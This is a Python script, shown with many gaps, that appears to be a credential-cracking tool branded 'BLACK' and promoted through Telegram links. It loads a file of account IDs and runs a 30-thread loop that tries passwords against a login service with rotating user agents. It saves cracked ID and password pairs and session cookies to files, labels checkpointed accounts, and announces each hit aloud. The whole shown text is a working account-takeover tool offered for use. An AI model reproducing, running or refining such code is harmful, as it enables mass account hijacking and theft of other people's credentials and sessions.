...
print('\033[97;1m[\033[92;1m+\033[97;1m] \033[0;92m5 CHRKA BOSTA BZAMM AW UPDATEAYA...? ')
time.sleep(5)
print('\033[97;1m[\033[92;1m+\033[97;1m] \033[0;92mTAWAWA HAWA 2 CHRKA BOSTA BZANM VERSION KONA....?')
time.sleep(2)
print('TAWAWA')
time.sleep(1)
os.system('clear')
 #------------------[ BLACK ]-------------------#
import os, platform, time, sys
print('\033[97;1m[\033[92;1m+\033[97;1m] \033[0;92mBLACK TOOLS FREE 👻🤡 ')
time.sleep(5)
os.system('clear')
print("\033[97;1m[\033[92;1m+\033[97;1m] \033[0;92mJOIN MY TELEGRAM GROUP")
time.sleep(2)
os.system(f'xdg-open https://t.me/KGF_TEAM_CYBER')
#------------------[ BLACK ]-------------------#
#------------------[ USER-AGENT ]-------------------#
...
\033[36;1m----------------------------------------------------
\033[32;1mCREATOR : \033[0;1m SC SEND AND GIVE : @ProgrammerAlex
\033[32;1mTELEGRAM : \033[0;1m https://t.me/+9llqPQbiQ1hiN2Vl
\033[32;1mVERSION : \033[0;1m OWNER TOOL "' 😹💀 : @ProgrammerAlex\033[36;1m----------------------------------------------------
"""
os.system('clear')
print(logo)
uname = input(" [\u001b[91m•\033[1;91m] 𝙣𝙖𝙬𝙩 𝙗𝙣𝙨𝙖 --:-- " )
print('\033[1;91m-m−−−−−−−−−−−−−−−−−−−−−−−−−−−𓅨')
...
def menu():
    os.system('clear')
    print(logo)
    print(f" [\u001b[91m•\033[1;91m] WELCOME     : {uname} ")
    print(" [\u001b[91m•\033[1;91m] TODAYS DATE : "+date)
    print("")
    print(f""" [\x1b[0;95m1\x1b[1;96m]  CrAcK-_-FILE""")
    print(""" [\u001b[91m0\033[1;91m] Exit""")
    print("")
...
def crack_file():
    linex()
    o = input(' [\u001b[91m•\033[1;91m] file dane : ')
    try:lin = open(o).read().splitlines()
    except:
        linex()
        animation(' [×] FILAKAT TWAW NYA✖️')
        time.sleep(2)
        back()
    for xid in lin:
        id.append(xid)
...
def setting():
    linex()
    print(" [\u001b[91m1\033[1;91m]  All Checking")
    linex()
    hu = input(' [\u001b[91m•\033[1;91m] CHOOSE : ')
    if hu in ['66','044']:
        ...
        for bacot in id:
            ...
            id2.insert(xx,bacot)
    linex()
    print(" [\u001b[91m•\033[1;91m] LOGIN METHOD ")
    linex()
    print(" [\u001b[91m1\033[1;91m] Mobile  ")
    linex()
    hc = input(' [\u001b[91m•\033[1;91m] CHOOSE : ')
    if hc in ['1','01']:
    ...
    with tred(max_workers=30) as pool:
        for yuzong in id2:
            ...
            if 'mobile' in method:
                ...
                pool.submit(crackfree,idf,pwv)
    print('\n\033[1;91m----------------------------------------------')
    print(' [\u001b[91m•\033[1;91m] CLONING COMPLETE AT '+time.strftime("%H:%M")+" "+ tag)
    print(' [\u001b[36m•\033[1;37m] OK : %s '%(ok))
    print(' [\u001b[36m•\033[1;37m] CP : %s '%(cp))
    linex()
    woi = input(' \u001b[91m>>\033[1;91m ENTER TO BACK')
    exit()
...
def crack(idf,pwv):
    ...
    sys.stdout.write(f"\r \r \033[1;35mBLACK-1987  {P}{k}\033[1;36m{loop}\033[1;31m{P}  {P}{H}[\033[1;32mOK:-{ok}{P} \033[1;31mCP:-{cp} {P}\033[1;31m{x}  {bo}{'{}'.format(loop/float(len(id)))}{P} "),
    sys.stdout.flush()
    ...
    for pw in pwv:
        try:
            ...
            if "checkpoint" in po.cookies.get_dict().keys():
                #print(f'\033[1;35m[DZHA-CP]   \033[1;35m {idf} |  \033[1;35m{pw}  | \033[1;35m{ua}')
                ...
                print(f'\r {hh}[𝐁𝐋𝐀𝐂𝐊-𝙊𝙆] {idf} | {pw}\n{kuki}')
                open('/sdcard/𝐁𝐋𝐀𝐂𝐊-Ok.txt','a').write(idf+' • '+pw+'\n')
                os.system('espeak -a 300 " Cracked, ok ,BLACK_tool"')
                cek_NIK(kuki)
                break
...
def crackfree(idf,pwv):
    global loop,ok,cp
    sys.stdout.write(f"\r {P}[black🔥TEST]{P} {P}{loop}{P}/{P}{len(id)}{P} OK{P}[{H}{ok}{P}] [{P}{'{:.0%}'.format(loop/float(len(id)))}{P}]  "),
    sys.stdout.flush()
    ua = random.choice(ugen)
    ua2 = random.choice(ugen2)
    ses = requests.Session()
    ...
    'viewport-width': '980',}
            ...
            if "checkpoint" in po.cookies.get_dict().keys():
                print ('\x1b[36m||')
                print(f'\r\033[0;93m[\33[1;96mblack-CP\33[1;93m]  {idf}  {pw} ')
                print ('\x1b[36m||')
                open('CP/'+cpc,'a').write(idf+' • '+pw+'\n')
                akun.append(idf+' • '+pw)
                cp+=1
                ...
                kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
                print ('\x1b[32m||')
                print(f'\r\33[1;93m[\33[1;91mblack-OK\33[1;93m] \33[1;92m{idf} {pw} ')
                os.system('espeak -a 300 " black CRACKED OK ID"')
                print ('\x1b[32m||')
